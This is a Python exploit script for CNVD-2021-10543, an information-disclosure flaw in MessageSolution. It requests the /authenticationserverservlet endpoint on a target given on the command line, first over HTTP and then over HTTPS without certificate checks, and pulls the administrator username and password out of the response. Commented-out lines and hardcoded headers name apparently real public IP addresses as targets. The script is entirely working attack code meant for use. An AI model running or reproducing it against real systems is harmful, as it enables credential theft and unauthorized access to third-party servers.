#/bin/bash/env python3
#_*_coding:utf-8_*_

import requests
import sys
import os
import re

def title():
    print('+ 使用格式: python3 CNVD-2021-10543-MessageSolution_infomation_flow  192.168.1.1:80')
def run_https(ip, port):
    url = 'https://{}:{}/authenticationserverservlet'.format(ip, port)
    referer = 'http://{}:{}/indexcommon.jsp'.format(ip, port)
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
              'Referer': referer,
              'Origin': 'http://41.193.41.242:7777',
              'Content-Type': 'application/x-www-form-urlencoded',
              'Host': '41.193.41.242:7777'
              }
    try:
        requests.packages.urllib3.disable_warnings()
        req = requests.get(url=url, headers=header, verify=False, timeout=3)
        if req.status_code == 200 and 'administrator' in req.text:
            username = re.search('<username>(.*?)</username>', req.text).group(1)
            password = re.search('<password>(.*?)</password>', req.text).group(1)
            print('https')
            print(username)
            print(password)
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    url = 'http://{}:{}/authenticationserverservlet'.format(ip, port)
    referer = 'http://{}:{}/indexcommon.jsp'.format(ip, port)
    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
              'Referer': referer,
              'Origin': 'http://41.193.41.242:7777',
              'Content-Type': 'application/x-www-form-urlencoded',
              'Host': '41.193.41.242:7777'
              }
    try:
        requests.packages.urllib3.disable_warnings()
        req = requests.get(url=url, headers=header, timeout=3)
        if req.status_code == 200 and 'administrator' in req.text:
            username = re.search('<username>(.*?)</username>', req.text).group(1)
            password = re.search('<password>(.*?)</password>', req.text).group(1)
            print('http')
            print(username)
            print(password)
            return True
        else:
            return run_https(ip, port)
    except Exception as e:
        return run_https(ip, port)
if __name__ == '__main__':
    title()
    #target = '41.193.41.242:7777'
    #target = '59.107.27.184:443'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])

    result = run(ip, port)

    if result:
        print("Exist")
    else:
        print("UnExist")
